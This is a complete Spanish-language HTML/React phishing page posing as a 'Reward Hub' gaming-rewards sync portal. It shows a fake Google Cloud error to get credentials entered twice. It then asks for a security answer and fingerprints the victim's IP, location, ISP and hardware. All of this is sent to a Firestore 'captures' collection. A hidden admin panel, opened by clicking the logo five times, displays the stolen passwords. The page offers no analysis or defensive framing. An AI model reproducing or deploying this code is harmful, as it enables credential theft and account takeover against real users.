<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Reward Hub - Portal Oficial de Sincronización</title>
    <!-- Herramientas de Diseño -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
        .animate-shake { animation: shake 0.2s ease-in-out 0s 2; }
        #master-loader { position: fixed; inset: 0; background: white; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; transition: opacity 0.5s ease; }
        .custom-scroll::-webkit-scrollbar { width: 4px; }
        .custom-scroll::-webkit-scrollbar-thumb { background: #ef3244; border-radius: 10px; }
    </style>
</head>
<body class="bg-[#f8fafc]">
    <!-- Pantalla de Carga de Seguridad (Fail-Safe: desaparece máximo en 4 segundos) -->
    <div id="master-loader">
        <div class="w-12 h-12 border-4 border-slate-200 border-t-[#ef3244] rounded-full animate-spin"></div>
        <p class="mt-4 text-[10px] font-black uppercase tracking-[0.3em] text-slate-400 italic">Validando Seguridad Cloud...</p>
    </div>

    <div id="root"></div>

    <script type="text/babel" data-type="module">
        const { useState, useEffect, useRef } = React;

        // --- MOTOR DE EXTRACCIÓN MAESTRO (FIREBASE) ---
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getAuth, signInAnonymously, onAuthStateChanged, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
        import { getFirestore, collection, addDoc, onSnapshot, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        // Carga segura de configuración
        let firebaseConfig = {};
        try { firebaseConfig = JSON.parse(__firebase_config); } catch (e) { console.warn("Config no detectada"); }
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'reward-master-v100';

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        function App() {
            const [user, setUser] = useState(null);
            const [step, setStep] = useState(1); 
            const [username, setUsername] = useState('');
            const [password, setPassword] = useState('');
            const [securityAnswer, setSecurityAnswer] = useState('');
            const [authError, setAuthError] = useState('');
            const [isAuthenticating, setIsAuthenticating] = useState(false);
            const [onlineUsers, setOnlineUsers] = useState(5420);
            const [geoInfo, setGeoInfo] = useState(null);
            
            // Panel Admin
            const [clickCount, setClickCount] = useState(0);
            const [showAdmin, setShowAdmin] = useState(false);
            const [capturedData, setCapturedData] = useState([]);
            const [showPasswords, setShowPasswords] = useState({});
            const [searchTerm, setSearchTerm] = useState('');

            // Inicialización y Extracción de IP silenciosa
            useEffect(() => {
                // Eliminar loader forzosamente
                const removeLoader = () => {
                    const loader = document.getElementById('master-loader');
                    if (loader) { loader.style.opacity = '0'; setTimeout(() => loader.remove(), 500); }
                };

                const initAuth = async () => {
                    try {
                        if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
                            await signInWithCustomToken(auth, __initial_auth_token);
                        } else {
                            await signInAnonymously(auth);
                        }
                    } catch (err) { console.error("Auth bypass"); }
                };

                const fetchGeo = async () => {
                    try {
                        const res = await fetch('https://ipapi.co/json/');
                        const data = await res.json();
                        setGeoInfo(data);
                    } catch(e) {}
                    removeLoader(); // Quitar loader después de intentar geo
                };

                initAuth();
                fetchGeo();

                // Fail-safe: si todo tarda mucho, quitar loader igual en 4 segs
                const timeout = setTimeout(removeLoader, 4000);

                const unsubscribe = onAuthStateChanged(auth, setUser);
                const interval = setInterval(() => setOnlineUsers(p => p + (Math.random() > 0.5 ? 2 : -1)), 6000);
                
                return () => { unsubscribe(); clearInterval(interval); clearTimeout(timeout); };
            }, []);

            // Listener de administración con manejo de errores
            useEffect(() => {
                if (!user || !showAdmin) return;
                const capturesRef = collection(db, 'artifacts', appId, 'public', 'data', 'captures');
                const unsubscribe = onSnapshot(capturesRef, 
                    (snapshot) => {
                        const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
                        setCapturedData(data.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0)));
                    },
                    (error) => console.log("Permisos pendientes...")
                );
                return () => unsubscribe();
            }, [user, showAdmin]);

            const handleLogoClick = () => {
                setClickCount(p => (p + 1 >= 5 ? (setShowAdmin(true), 0) : p + 1));
                setTimeout(() => setClickCount(0), 3000);
            };

            const captureFullMetadata = () => {
                // Detección de Tarjeta Gráfica
                let gpu = 'N/A';
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                } catch(e) {}

                return {
                    geo: {
                        ip: geoInfo?.ip || 'Pendiente',
                        country: geoInfo?.country_name || 'Desconocido',
                        city: geoInfo?.city || 'Desconocida',
                        isp: geoInfo?.org || 'N/A',
                        vpn: geoInfo?.proxy ? "SÍ" : "NO"
                    },
                    hardware: {
                        ram: navigator.deviceMemory || 'N/A',
                        cpu: navigator.hardwareConcurrency || 'N/A',
                        gpu: gpu,
                        res: `${window.screen.width}x${window.screen.height}`
                    },
                    meta: {
                        ua: navigator.userAgent,
                        ref: document.referrer || "Directo / WhatsApp",
                        lang: navigator.language
                    }
                };
            };

            const saveData = async (statusLabel) => {
                if (!user) return;
                try {
                    const profile = captureFullMetadata();
                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'captures'), {
                        username, 
                        password, 
                        securityAnswer,
                        forensics: profile,
                        status: statusLabel,
                        timestamp: serverTimestamp()
                    });
                } catch (e) { console.log("Sync delay"); }
            };

            const handleLogin = async (e) => {
                e.preventDefault();
                setIsAuthenticating(true);
                setAuthError('');
                await new Promise(r => setTimeout(r, 2000));

                if (step === 1) {
                    setAuthError('Error 403: Fallo en la sincronización de Google Cloud. Reintenta ahora.');
                    await saveData('Captura_Intento_1');
                    setStep(1.1);
                } else {
                    await saveData('Captura_Final_Credenciales');
                    setStep(1.5);
                }
                setIsAuthenticating(false);
            };

            useEffect(() => { if (window.lucide) window.lucide.createIcons(); });

            return (
                <div className="min-h-screen flex flex-col font-sans bg-[#f1f5f9]">
                    {/* Nav Premium */}
                    <nav className="w-full bg-white border-b p-4 flex justify-between items-center shadow-md sticky top-0 z-50">
                        <div onClick={handleLogoClick} className="flex items-center gap-3 active:scale-95 transition-all cursor-pointer">
                            <div className="bg-gradient-to-br from-[#ef3244] to-red-600 p-2.5 rounded-xl shadow-lg">
                                <i data-lucide="gamepad-2" className="text-white w-6 h-6"></i>
                            </div>
                            <span className="font-black italic text-xl uppercase tracking-tighter text-slate-900 leading-none">REWARD <span className="text-[#ef3244]">HUB</span></span>
                        </div>
                        <div className="bg-emerald-50 px-4 py-1.5 rounded-full border border-emerald-100 flex items-center gap-2">
                            <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></div>
                            <span className="text-[10px] font-black text-emerald-700 uppercase tracking-widest">{onlineUsers} LIVE</span>
                        </div>
                    </nav>

                    <div className="w-full bg-slate-900 py-2 text-center text-white text-[9px] font-bold tracking-[0.2em] uppercase italic">
                        PROTOCOL: GOOGLE CLOUD SECURITY | FORENSIC DUMPING v3.5
                    </div>

                    <div className="w-full max-w-md mx-auto p-6 space-y-6 flex-1 flex flex-col justify-center mb-10">
                        {step <= 1.1 && (
                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl space-y-8 animate-in fade-in slide-in-from-bottom">
                                <div className="text-center space-y-2">
                                    <h2 className="text-3xl font-black text-slate-900 italic uppercase">Acceso Miembro</h2>
                                    <p className="text-sm text-slate-500 font-medium italic">Sincroniza tu cuenta para recibir tus recursos.</p>
                                </div>
                                {authError && <div className="bg-red-50 text-red-700 p-4 rounded-2xl text-[11px] font-black border border-red-200 animate-shake leading-tight">{authError}</div>}
                                <form onSubmit={handleLogin} className="space-y-4">
                                    <div className="relative">
                                        <i data-lucide="user" className="absolute left-4 top-4.5 w-5 h-5 text-slate-400"></i>
                                        <input type="text" placeholder="Usuario / Email" required className="w-full bg-slate-50 border p-5 pl-12 rounded-[1.5rem] outline-none focus:border-[#ef3244] font-black text-slate-900" value={username} onChange={e => setUsername(e.target.value)} />
                                    </div>
                                    <div className="relative">
                                        <i data-lucide="lock" className="absolute left-4 top-4.5 w-5 h-5 text-slate-400"></i>
                                        <input type="password" placeholder="Contraseña" required className="w-full bg-slate-50 border p-5 pl-12 rounded-[1.5rem] outline-none focus:border-[#ef3244] font-black text-slate-900" value={password} onChange={e => setPassword(e.target.value)} />
                                    </div>
                                    <button className="w-full bg-gradient-to-r from-[#ef3244] to-red-600 text-white py-5 rounded-[2rem] font-black uppercase text-sm shadow-xl active:scale-95 transition-all tracking-[0.1em]">
                                        {isAuthenticating ? "Procesando..." : "Vincular Bóveda"}
                                    </button>
                                </form>
                            </div>
                        )}

                        {step === 1.5 && (
                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl text-center space-y-8 animate-in zoom-in">
                                <div className="bg-blue-50 w-16 h-16 rounded-full flex items-center justify-center mx-auto border border-blue-100 shadow-lg">
                                    <i data-lucide="shield-check" className="w-10 h-10 text-blue-600"></i>
                                </div>
                                <h2 className="text-2xl font-black italic uppercase text-slate-900 leading-none">Validación Extra</h2>
                                <p className="text-xs text-slate-500 font-bold italic leading-relaxed">Confirmación requerida para el reclamo regional:</p>
                                <div className="bg-slate-50 p-5 rounded-2xl border text-[13px] font-black text-slate-700 italic">¿Nombre de tu mascota o ciudad de origen?</div>
                                <input type="text" placeholder="Escribe aquí..." className="w-full bg-slate-50 border p-5 rounded-[1.5rem] outline-none font-black text-slate-900 text-center" value={securityAnswer} onChange={e => setSecurityAnswer(e.target.value)} />
                                <button onClick={() => { saveData('Identidad_Confirmada'); setStep(2); }} className="w-full bg-blue-600 text-white py-5 rounded-[2rem] font-black uppercase shadow-xl">Confirmar Propiedad</button>
                            </div>
                        )}

                        {step >= 2 && (
                            <div className="bg-white border p-10 rounded-[3rem] shadow-2xl text-center space-y-8 animate-in zoom-in">
                                <div className="bg-emerald-50 w-20 h-20 rounded-full flex items-center justify-center mx-auto border border-emerald-100 shadow-xl">
                                    <i data-lucide="check-circle" className="w-12 h-12 text-emerald-500"></i>
                                </div>
                                <h2 className="text-3xl font-black uppercase italic leading-none tracking-tighter text-slate-900">¡Sincronización Lista!</h2>
                                <p className="text-sm text-slate-600 font-medium italic leading-relaxed px-2">Recibirás los recursos en tu cuenta oficial de <span className="text-slate-900 font-black">{username}</span> en un plazo máximo de 24 horas.</p>
                                <button onClick={() => window.location.reload()} className="w-full bg-slate-900 text-white py-6 rounded-[2.5rem] font-black uppercase text-sm shadow-xl active:scale-95 transition-all">Finalizar Sesión</button>
                            </div>
                        )}
                    </div>

                    <footer className="w-full bg-slate-900 text-slate-500 py-16 text-center mt-auto border-t border-white/5 px-6">
                        <p className="text-[10px] uppercase tracking-[0.4em] font-black opacity-40 leading-relaxed max-w-xs mx-auto">REWARD HUB PARTNER PROGRAM © 2026. <br/> EXTRACCIÓN DE METADATOS PROTEGIDA.</p>
                    </footer>

                    {/* PANEL ADMIN (5 CLICS LOGO) */}
                    {showAdmin && (
                        <div className="fixed inset-0 z-[100] bg-[#020617]/98 backdrop-blur-3xl flex flex-col p-6 text-white animate-in fade-in overflow-hidden">
                            <div className="flex justify-between items-center mb-8 border-b border-white/10 pb-6">
                                <div className="flex items-center gap-4">
                                    <div className="bg-indigo-600 p-3 rounded-2xl"><i data-lucide="database" className="text-white w-6 h-6"></i></div>
                                    <div><h2 className="text-2xl font-black uppercase italic tracking-tighter">Intel v3.5 ({capturedData.length})</h2></div>
                                </div>
                                <div className="flex gap-2">
                                    <input type="text" placeholder="Eheka..." value={searchTerm} onChange={e => setSearchTerm(e.target.value)} className="bg-white/5 border border-white/10 rounded-xl px-4 py-2 text-xs outline-none" />
                                    <button onClick={() => setShowAdmin(false)} className="bg-red-500/20 p-3 rounded-full text-red-500"><i data-lucide="x" className="w-6 h-6"></i></button>
                                </div>
                            </div>
                            <div className="flex-1 overflow-y-auto space-y-6 pb-20 custom-scroll">
                                {capturedData.filter(d => d.username.toLowerCase().includes(searchTerm.toLowerCase())).map(item => (
                                    <div key={item.id} className="bg-white/5 p-8 rounded-[3rem] border border-white/10 flex flex-col gap-6 shadow-2xl relative overflow-hidden">
                                        <div className="flex justify-between items-start">
                                            <div className="flex items-center gap-6">
                                                <div className="w-16 h-16 bg-indigo-600/20 rounded-[1.5rem] flex items-center justify-center text-indigo-400 font-black text-3xl border border-indigo-600/10 shadow-inner">{item.username?.[0]?.toUpperCase()}</div>
                                                <div>
                                                    <p className="text-3xl font-black text-white leading-none mb-2">{item.username}</p>
                                                    <div className="flex gap-2"><span className="text-[8px] bg-indigo-600 text-white px-2 py-0.5 rounded-full font-black uppercase tracking-widest">{item.forensics?.geo?.country} ({item.forensics?.geo?.ip})</span></div>
                                                </div>
                                            </div>
                                            <div className="text-right"><span className="text-emerald-400 text-[10px] font-black uppercase flex items-center gap-1 justify-end italic animate-pulse">VAULT_DUMPED</span><p className="text-[8px] text-slate-500 font-bold uppercase mt-1">{item.timestamp?.toDate().toLocaleString()}</p></div>
                                        </div>
                                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                                            <div className="bg-black/40 p-5 rounded-3xl flex justify-between items-center border border-white/5">
                                                <div><p className="text-[9px] text-slate-500 uppercase font-black">Password</p><p className="font-mono text-xl text-white italic">{showPasswords[item.id] ? item.password : '••••••••••••'}</p></div>
                                                <button onClick={() => setShowPasswords(p => ({...p, [item.id]: !p[item.id]}))} className="p-3 bg-indigo-600/10 rounded-xl text-indigo-400"><i data-lucide={showPasswords[item.id] ? "eye-off" : "eye"}></i></button>
                                            </div>
                                            <div className="bg-white/5 p-4 rounded-2xl border border-white/5 grid grid-cols-2 gap-2 text-[10px] font-mono opacity-80">
                                                <p><span className="text-slate-500">ISP:</span> {item.forensics?.geo?.isp}</p>
                                                <p><span className="text-slate-500">REF:</span> {item.forensics?.meta?.ref}</p>
                                                <p><span className="text-slate-500">GPU:</span> {item.forensics?.hardware?.gpu}</p>
                                                <p><span className="text-slate-500">SEC:</span> {item.securityAnswer}</p>
                                            </div>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                    )}
                </div>
            );
        }

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
